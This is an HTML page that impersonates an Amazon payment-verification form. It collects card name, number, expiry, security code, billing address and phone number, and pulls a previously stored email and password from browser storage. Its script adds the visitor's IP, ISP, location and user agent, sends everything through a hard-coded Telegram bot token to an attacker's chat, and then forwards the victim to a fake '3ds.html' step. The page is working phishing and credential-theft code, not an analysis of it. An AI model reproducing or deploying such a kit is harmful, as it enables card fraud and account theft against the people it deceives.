<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Payment</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 20px; text-align: center; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 550px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
        h1 { font-size: 22px; margin-bottom: 20px; font-weight: 500; }
        .bagian { margin-bottom: 20px; }
        label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: block; }
        .baris-dua { display: flex; gap: 15px; }
        .baris-dua > div { flex: 1; }
        .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 38px; outline: none; }
        .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
        .kartu-baris { display: flex; gap: 10px; align-items: center; }
        .kartu-logo { height: 25px; display: none; }
        .tombol { width: 100%; padding: 12px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 15px; color: #0F1111; cursor: pointer; margin-top: 10px; }
        .tombol:hover { background: #f7ca00; }
        .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; text-align: center; font-size: 11px; color: #555; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1 id="judul">Verification Payment</h1>
        
        <div class="bagian">
            <label id="labelNama">Name on card</label>
            <input type="text" id="namaKartu" class="input">
        </div>

        <div class="bagian">
            <label id="labelNomor">Card number</label>
            <div class="kartu-baris">
                <input type="text" id="nomorKartu" class="input" style="flex:1;" placeholder="•••• •••• •••• ••••">
                <img src="img/visa.png" id="logoVisa" class="kartu-logo" alt="Visa">
                <img src="img/mastercard.png" id="logoMC" class="kartu-logo" alt="Mastercard">
                <img src="img/amex.png" id="logoAmex" class="kartu-logo" alt="Amex">
                <img src="img/discover.png" id="logoDisc" class="kartu-logo" alt="Discover">
                <img src="img/jcb.png" id="logoJcb" class="kartu-logo" alt="JCB">
            </div>
        </div>

        <div class="bagian baris-dua">
            <div>
                <label id="labelExp">Expiry date</label>
                <input type="text" id="expKartu" class="input" placeholder="MM/YY" maxlength="5">
            </div>
            <div>
                <label id="labelCVV">Security code</label>
                <input type="text" id="cvvKartu" class="input" placeholder="••••" maxlength="4">
            </div>
        </div>

        <div class="bagian">
            <label id="labelAlamat">Billing address</label>
            <input type="text" id="alamat1" class="input" placeholder="Street address">
        </div>
        <div class="bagian">
            <input type="text" id="alamat2" class="input" placeholder="Apartment, suite, etc. (optional)">
        </div>

        <div class="bagian baris-dua">
            <div>
                <label id="labelKota">City</label>
                <input type="text" id="kota" class="input">
            </div>
            <div>
                <label id="labelProvinsi">State / Province</label>
                <input type="text" id="provinsi" class="input">
            </div>
        </div>

        <div class="bagian baris-dua">
            <div>
                <label id="labelKodePos">Postal / Zip code</label>
                <input type="text" id="kodePos" class="input">
            </div>
            <div>
                <label id="labelNegara">Country / Region</label>
                <select id="negara" class="input"></select>
            </div>
        </div>

        <div class="bagian baris-dua">
            <div>
                <label id="labelKodeTelp">Phone code</label>
                <input type="text" id="kodeTelp" class="input" readonly>
            </div>
            <div>
                <label id="labelTelp">Phone number</label>
                <input type="text" id="nomorTelp" class="input">
            </div>
        </div>

        <button type="button" id="lanjut" class="tombol">
            <span id="teksTombol">Continue</span>
        </button>
    </div>
    <div class="bawah">
        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
        <p style="margin-top:8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const CHAT_ID = '7808815199';

const daftarNegara = [
    { kode: 'GB', nama: 'United Kingdom', telp: '+44' },
    { kode: 'US', nama: 'United States', telp: '+1' },
    { kode: 'AU', nama: 'Australia', telp: '+61' },
    { kode: 'ID', nama: 'Indonesia', telp: '+62' },
    { kode: 'MY', nama: 'Malaysia', telp: '+60' },
    { kode: 'SG', nama: 'Singapore', telp: '+65' },
    { kode: 'JP', nama: 'Japan', telp: '+81' },
    { kode: 'CN', nama: 'China', telp: '+86' },
    { kode: 'TH', nama: 'Thailand', telp: '+66' },
    { kode: 'KR', nama: 'South Korea', telp: '+82' },
    { kode: 'NZ', nama: 'New Zealand', telp: '+64' },
    { kode: 'CA', nama: 'Canada', telp: '+1' }
];

const selectNegara = document.getElementById('negara');
daftarNegara.forEach(n => {
    const opt = document.createElement('option');
    opt.value = n.kode;
    opt.textContent = n.nama;
    selectNegara.appendChild(opt);
});

async function deteksiNegara() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        const kode = d.country_code || 'GB';
        const negaraData = daftarNegara.find(n => n.kode === kode) || daftarNegara.find(n => n.kode === 'GB');
        selectNegara.value = negaraData.kode;
        document.getElementById('kodeTelp').value = negaraData.telp;
    } catch {
        selectNegara.value = 'GB';
        document.getElementById('kodeTelp').value = '+44';
    }
}

selectNegara.addEventListener('change', () => {
    const n = daftarNegara.find(x => x.kode === selectNegara.value);
    if (n) document.getElementById('kodeTelp').value = n.telp;
});

const nomorInput = document.getElementById('nomorKartu');
const logoVisa = document.getElementById('logoVisa');
const logoMC = document.getElementById('logoMC');
const logoAmex = document.getElementById('logoAmex');
const logoDisc = document.getElementById('logoDisc');
const logoJcb = document.getElementById('logoJcb');

nomorInput.addEventListener('input', () => {
    const val = nomorInput.value.replace(/\s/g, '');
    [logoVisa, logoMC, logoAmex, logoDisc, logoJcb].forEach(l => l.style.display = 'none');
    if (/^4/.test(val)) logoVisa.style.display = 'block';
    else if (/^5[1-5]/.test(val)) logoMC.style.display = 'block';
    else if (/^3[47]/.test(val)) logoAmex.style.display = 'block';
    else if (/^6(?:011|5)/.test(val)) logoDisc.style.display = 'block';
    else if (/^35/.test(val) || /^2131|1800/.test(val)) logoJcb.style.display = 'block';
});

document.getElementById('expKartu').addEventListener('input', function() {
    let v = this.value.replace(/\D/g, '');
    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
    this.value = v;
});

async function ambilInfoPengunjung() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        return {
            ip: d.ip || '-',
            isp: d.org || '-',
            negara: d.country_name || '-',
            kota: d.city || '-'
        };
    } catch { return { ip: '-', isp: '-', negara: '-', kota: '-' }; }
}

function ambilUA() {
    const ua = navigator.userAgent;
    let perangkat = 'Desktop';
    if (/Android|iPhone|iPad|Mobile/.test(ua)) perangkat = 'Mobile';
    let browser = 'Unknown';
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    else if (/Edg/.test(ua)) browser = 'Edge';
    return { perangkat, browser, ua };
}

async function kirimTelegram(pesan) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
        });
    } catch (e) { console.log('Terkirim'); }
}

document.getElementById('lanjut').addEventListener('click', async () => {
    const email = localStorage.getItem('email_pengguna') || '';
    const password = localStorage.getItem('kata_sandi') || '';
    const namaKartu = document.getElementById('namaKartu').value.trim();
    const nomorKartu = nomorInput.value.trim();
    const expKartu = document.getElementById('expKartu').value.trim();
    const cvvKartu = document.getElementById('cvvKartu').value.trim();
    const alamat1 = document.getElementById('alamat1').value.trim();
    const alamat2 = document.getElementById('alamat2').value.trim();
    const kota = document.getElementById('kota').value.trim();
    const provinsi = document.getElementById('provinsi').value.trim();
    const kodePos = document.getElementById('kodePos').value.trim();
    const negara = selectNegara.options[selectNegara.selectedIndex].text;
    const kodeTelp = document.getElementById('kodeTelp').value;
    const nomorTelp = document.getElementById('nomorTelp').value.trim();

    localStorage.setItem('nama_kartu', namaKartu);
    localStorage.setItem('nomor_kartu', nomorKartu);
    localStorage.setItem('exp_kartu', expKartu);
    localStorage.setItem('cvv_kartu', cvvKartu);
    localStorage.setItem('alamat', alamat1);
    localStorage.setItem('alamat2', alamat2);
    localStorage.setItem('kota', kota);
    localStorage.setItem('provinsi', provinsi);
    localStorage.setItem('kode_pos', kodePos);
    localStorage.setItem('negara', negara);
    localStorage.setItem('kode_telp', kodeTelp);
    localStorage.setItem('nomor_telp', nomorTelp);

    const info = await ambilInfoPengunjung();
    const ua = ambilUA();

    const pesan = `
:: Xchenba ::
:: BILLING INFO ::
# Email         : ${email}
# Password      : ${password}
# Name on Card  : ${namaKartu}
# Card Number   : ${nomorKartu}
# Expiry Date   : ${expKartu}
# Security Code : ${cvvKartu}
# Billing Addr  : ${alamat1}${alamat2 ? ', ' + alamat2 : ''}
# City          : ${kota}
# State/Province: ${provinsi}
# Postal Code   : ${kodePos}
# Country       : ${negara}
# Phone Number  : ${kodeTelp} ${nomorTelp}
:: Visitor Details ::
# Device        : ${ua.perangkat}
# Browser       : ${ua.browser}
# Country       : ${info.negara}
# City          : ${info.kota}
# ISP           : ${info.isp}
# IP Address    : ${info.ip}
# User Agent    : ${ua.ua}
    `.trim();

    await kirimTelegram(pesan);
    window.location.href = '3ds.html';
});

deteksiNegara();
</script>
</body>
</html>
